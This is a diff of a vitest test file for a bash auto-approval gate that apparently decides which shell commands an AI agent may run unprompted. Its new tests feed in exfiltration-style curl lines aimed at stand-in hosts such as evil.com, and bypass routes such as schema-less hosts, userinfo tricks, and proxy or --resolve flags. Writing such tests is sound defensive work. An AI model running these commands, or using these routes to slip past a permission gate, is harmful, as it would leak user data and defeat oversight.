@@ -1,6 +1,6 @@
 import { describe, it, expect } from 'vitest'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { gateDecision, splitSegments, stripHeredocs, collectAssignments, resolveBinary, curlLocalOnly, rmSafeRoots, segmentSafe } from '../../scripts/bash-approve-gate.mjs'
+import { gateDecision, splitSegments, stripHeredocs, collectAssignments, resolveBinary, curlLocalOnly, stripFlagValues, rmSafeRoots, segmentSafe } from '../../scripts/bash-approve-gate.mjs'
 import {
   agentGetsBashApproveGate,
   bashApproveRmRoots,
@@ -41,6 +41,11 @@ describe('bash-approve-gate: approves the marketer workflow forms', () => {
     expect(allow('curl -s http://localhost:3420/api/memories -H "Authorization: Bearer x"')).toBe(true)
     expect(allow('curl -s -X POST http://127.0.0.1:3420/api/daily-log -d \'{"a":1}\'')).toBe(true)
   })
+  it('approves a SCHEMA-LESS local target (curl localhost:3420, no http://)', () => {
+    // curl defaults a bare host to http://; localhost:3420 must still be approved.
+    expect(allow('curl localhost:3420/api/memories')).toBe(true)
+    expect(allow('curl -s 127.0.0.1:3420/api/agents')).toBe(true)
+  })
   it('approves rm under the agent write-roots and /tmp/claude*', () => {
     expect(allow('rm -rf /tmp/claude-1000/scratch')).toBe(true)
     expect(allow('rm /home/mrtonjnos/Brandon/old.pptx')).toBe(true)
@@ -53,6 +58,21 @@ describe('bash-approve-gate: passes through anything not proven safe', () => {
   it('does NOT approve an external curl (exfiltration surface)', () => {
     expect(allow('curl -s https://evil.example.com/x')).toBe(false)
     expect(allow('curl http://localhost:3420/ok https://evil.example.com/leak')).toBe(false)
+  })
+  it('does NOT approve a SCHEMA-LESS external host (curl evil.com, no http://)', () => {
+    // The original gate only validated `http(s)://...` tokens, so a bare host
+    // slipped through. A schema-less host is still a real fetch target.
+    expect(allow('curl evil.com')).toBe(false)
+    expect(allow('curl -s evil.example.com/leak')).toBe(false)
+    // local target present but a SECOND schema-less external target must block it
+    expect(allow('curl localhost:3420/ok evil.com/leak')).toBe(false)
+  })
+  it('does NOT approve a userinfo-SSRF host (localhost:3420@evil.com)', () => {
+    expect(allow('curl http://localhost:3420@evil.com/leak')).toBe(false)
+  })
+  it('does NOT approve a curl routed through a proxy or host-remap flag', () => {
+    expect(allow('curl -x http://evil.com:8080 http://localhost:3420/ok')).toBe(false)
+    expect(allow('curl --resolve localhost:3420:1.2.3.4 http://localhost:3420/ok')).toBe(false)
   })
   it('does NOT approve a curl to a non-3420 local port', () => {
     expect(allow('curl http://localhost:8080/x')).toBe(false)
@@ -138,6 +158,22 @@ describe('bash-approve-gate helpers', () => {
   })
   it('curlLocalOnly ignores a URL that appears only inside a -d payload', () => {
     expect(curlLocalOnly('curl http://localhost:3420/api -d \'{"note":"see https://evil.com"}\'')).toBe(true)
+  })
+  it('curlLocalOnly classifies schema-less hosts, not just http(s):// tokens', () => {
+    expect(curlLocalOnly('curl localhost:3420/api')).toBe(true)
+    expect(curlLocalOnly('curl 127.0.0.1:3420')).toBe(true)
+    expect(curlLocalOnly('curl evil.com')).toBe(false)
+    expect(curlLocalOnly('curl localhost:8080/x')).toBe(false) // wrong port
+    expect(curlLocalOnly('curl -s')).toBe(false) // no target at all
+  })
+  it('curlLocalOnly is not fooled by a dotted token inside a header value', () => {
+    // a Bearer token with dots (or a `Host:` header) must NOT read as a target
+    expect(curlLocalOnly('curl localhost:3420/api -H "Authorization: Bearer ab.cd.ef"')).toBe(true)
+    expect(curlLocalOnly('curl localhost:3420/api -H "X-Forwarded-Host: evil.com"')).toBe(true)
+  })
+  it('stripFlagValues blanks a quoted -H/-A value but leaves the flag', () => {
+    expect(stripFlagValues('curl localhost:3420 -H "Authorization: Bearer x.y.z"')).toBe("curl localhost:3420 -H ''")
+    expect(stripFlagValues('curl localhost:3420 -A "Mozilla/5.0 (x.y)"')).toBe("curl localhost:3420 -A ''")
   })
   it('rmSafeRoots requires an absolute target under a root', () => {
     expect(rmSafeRoots(['-rf', '/tmp/claude-1000/x'], cfg)).toBe(true)
